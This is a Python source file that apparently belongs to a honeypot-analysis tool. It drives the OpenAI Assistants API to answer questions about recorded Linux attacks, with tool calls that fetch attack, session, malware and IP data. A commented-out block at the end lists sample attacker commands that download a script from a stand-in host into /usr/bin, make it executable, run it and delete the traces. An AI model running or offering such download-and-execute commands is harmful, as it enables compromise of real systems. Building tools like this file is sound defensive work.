from analyzerbase import *
from .aibase import *


class OpenAIAssistantAnalyzer(OpenAIAnalyzerBase):
    
    
    def __init__(self, training_data_dir=Path("openai-training-data"), 
                 aidb_path=Path("tests/aidb"), 
                 api_key=OPENAI_API_KEY, 
                 model="gpt-4-1106-preview") -> None:
        super().__init__(training_data_dir, aidb_path, api_key, model)
        
        self.ai_assistants_dir = self.training_data_dir / "assistants"
        if not self.ai_assistants_dir.exists():
            self.ai_assistants_dir.mkdir(exist_ok=True, parents=True)
        
        self.ai_question_answers_dir = self.training_data_dir / "question_answers"
        if not self.ai_question_answers_dir.exists():
            self.ai_question_answers_dir.mkdir(exist_ok=True, parents=True)
        
        self.ai_assistants = {}
        self.ai_threads = {}
        self.ai_messages = {}
        self.ai_runs = {}

    
    def create_assistant(self, **kwargs):
        assistant = self.client.beta.assistants.create(
            model = kwargs.pop("model") or self.model,
            **kwargs,
        )
        
        with (self.ai_assistants_dir / "assistant_ids.txt").open("a+") as f:
            f.write(assistant.id + '\n')
        
        self.ai_assistants[assistant.id] = assistant
        return assistant
    

    def create_thread(self):
        thread = self.client.beta.threads.create()
        
        with (self.ai_assistants_dir / "thread_ids.txt").open("a+") as f:
            f.write(thread.id + '\n')


        self.ai_threads[thread.id] = thread
        return thread
    
    

    def create_run(self, ass_id, thread_id, **kwargs):
        run = self.client.beta.threads.runs.create(
                assistant_id=ass_id,
                thread_id=thread_id,
                **kwargs
        )

        with (self.ai_assistants_dir / "run_ids.txt").open("a+") as f:
            f.write(run.id + '\n')
        
        self.ai_runs[run.id] = run
        return run
    


    def get_assistant(self, ass_id):
        assistant = self.ai_assistants.get(ass_id)
        
        if not assistant:
            assistant = self.client.beta.assistants.retrieve(ass_id)
            self.ai_assistants[assistant.id] = assistant

        return assistant


    def get_thread(self, thread_id):
        thread = self.ai_threads.get(thread_id)
        
        if not thread:
            thread = self.client.beta.threads.retrieve(thread_id)
            self.ai_threads[thread_id] = thread

        return thread


    def update_assistant(self, ass_id, **kwargs):
        assistant = self.client.beta.assistants.update(
                        ass_id, **kwargs)

        return assistant
    

    
    def add_message_to_thread(self, content, thread_id):
        role = "user"
        message = self.client.beta.threads.messages.create(
            thread_id=thread_id,
            content=content,
            role=role
            
            )
        return message
    



    def wait_for_response(self, thread_id, run_id, attack, sleep_interval=5, **kwargs):
        
        run = None
        while not run or run.status in ("queued", "in_progress"):
            run = self.client.beta.threads.runs.retrieve(
                        thread_id=thread_id,
                        run_id=run_id
                        )
            
            print(f"Status: {run.status} Thread id: {thread_id}, run_id: {run_id}")

            if run.status == "requires_action":
                return self.handle_submit_tool_outputs_required(run, attack, sleep_interval, **kwargs)

            elif run.status == "cancelled":
                pass
            
            elif run.status == "completed":
                break

            else:
                print(f"Waiting {sleep_interval} seconds for response")
                sleep(sleep_interval)
        
        return self.client.beta.threads.messages.list(thread_id)
        
    


    def handle_submit_tool_outputs_required(self, run, attack, sleep_interval=5, **kwargs):
        tool_outputs=[]
        for tool_call in run.required_action.submit_tool_outputs.tool_calls:
            tool_name = tool_call.function.name
            arguments = json.loads(tool_call.function.arguments)

            tool_output = self._do_tool_call(tool_name, arguments, attack, **kwargs)

            tool_outputs.append({
                "tool_call_id": tool_call.id,
                "output":  self.format_content(tool_output)
            })


        run = self.client.beta.threads.runs.submit_tool_outputs(
                thread_id=run.thread_id,
                run_id=run.id,
                tool_outputs=tool_outputs
                )
        

        return self.wait_for_response(run.thread_id, run.id, attack, sleep_interval, **kwargs)
    



    def run_with_assistant(self, 
                           content, 
                           ass_id=None, 
                           thread_id=None, 
                           system_prompt=None, 
                           tools=[], 
                           prepend_content=[], 
                           attack=None,
                           sleep_interval=5,
                           **kwargs                   
                           ):
        
        ass = self.get_assistant(ass_id) if ass_id else self.create_assistant()
        thread = self.get_thread(thread_id) if thread_id else self.create_thread()

        update_kwargs = {}
        if system_prompt != ass.instructions:
            update_kwargs.update({"instructions": system_prompt})
        
        if [tool["function"]["name"] for tool in tools] != [tool.function.name for tool in ass.tools]:
            
            update_kwargs.update({"tools": tools})
        
        if update_kwargs:
            ass = self.update_assistant(ass_id, **update_kwargs)
        
        for precontent in prepend_content:
            self.add_message_to_thread(precontent, thread.id)

        self.add_message_to_thread(content, thread.id)


        run = self.create_run(ass.id, thread.id, **kwargs)
        messages = self.wait_for_response(thread.id, run.id, attack, sleep_interval, **kwargs)


        print("done")
        return ass, thread, run, messages 



    def ass_answer_questions(self, questions, attack: Attack):
        
        system_prompt = ''.join([
        "Your role is to answer questions about an attack on a Linux honeypot. "
        "You will analyze the commands executed, uploaded/downloaded files, and logs from the honeypot that contain any of the attacking IP(s), " 
        "and OSINT data gathered about the attacking IP(s) including: geolocation, open ports, running services, "
        "threatfeed reports and previous reports of known malware associated with the IP(s). "
        "Your answers will be used in a GitHub .md file so you should use markdown syntax to format your output. "
        "Use the available functions to request relevant information to thoroughly answer each question. "
        "For example if you see that the attacker downloaded malware in the commands, "
        "you should use get_attack_attrs function with the arguement 'malware' to get a list of malware_ids associated with the attack, "
        "then use get_malware_attrs to analyze the malware before answering. "
        ])
        


        tools = TOOLS

       
            
        fmtd_questions = self.index_content(questions)
        fmtd_questions_json = self.format_content(fmtd_questions)

        tool_choice = {"type":"function", 
                       "function": {"name": "select_function"}
                       }
        
        question_answers = {}
        ass_id = "asst_R5O9vhLKONwNlqmmxbMYugLo"
        thread_id = None

        for question in questions:
            # Prevent calling same question on an attack
            attack_qa_hash = sha256hex(question + attack.attack_id)
            question_answer_file = self.ai_question_answers_dir / attack_qa_hash
            if question_answer_file.exists():
                with question_answer_file.open("r") as f:
                    question_answer = json.load(f)
                    question_answers.update(question_answer)
                    continue

            print(f"Asking: {question}")
            
            ass, thread, run, messages = self.run_with_assistant(
                content=question,
                ass_id=ass_id,
                thread_id=thread_id,
            system_prompt=system_prompt,
            tools=tools,
            #prepend_content=prepend_content,
            attack=attack,
            #tool_choice=tool_choice
            )
            ass_id = ass.id
            thread_id = thread.id            
            answer = messages.data[0].content[0].text.value
            question_answers[question] = answer
            print(f"{question}\n{answer}")

            # Store for later
            with question_answer_file.open("w+") as f:
                json.dump({question: answer}, f)

        return question_answers


    def _do_tool_call(self, tool_name, arguments, attack, **kwargs):
        print(f'AI Assistant called tool: {tool_name} with args: {arguments}')

        
        tool_output = {}
        if tool_name == "get_attack_attrs":
            tool_output = {
                attr: getattr(attack, attr) for attr in arguments["attrs"]
            }
        
        elif tool_name == "get_session_attrs":
            session = attack.get_session_by_id(arguments['session_id'])
            tool_output = {
                attr: getattr(session, attr) for attr in arguments["attrs"]
            }

        elif tool_name == "get_malware_attrs":
            malware = attack.get_malware_by_id(arguments['malware_id'])
            tool_output = {
                attr: getattr(malware, attr) for attr in arguments["attrs"]
            }
        
        elif tool_name == "get_data_for_ips":
            if not isinstance(arguments['ips'], list):
                arguments['ips'] = [arguments['ips']]
            if not isinstance(arguments['sources'], list):
                arguments['sources'] = [arguments['sources']]

            tool_output = attack.get_data_for_ips(
                    arguments["ips"],
                    arguments['sources']
                )

        print(f'Returning tool output: {tool_output}')
        return tool_output

















if __name__ == "__main__":

    pass
    # example_commands1 = ["wget http://example.com -O /usr/bin/example.sh", 
    #                          "cd /usr/bin;chmod +x example.sh", 
    #                          "./example.sh >> example_output.py", 
    #                          "exec example_output.py || python3 example_output.py &",
    #                          "ps -ajfx | grep example_output.py", 
    #                          "rm example.sh",  "rm example_output.py", "exit"]
    

    # ass_analyzer = OpenAIAssistantAnalyzer()
    


























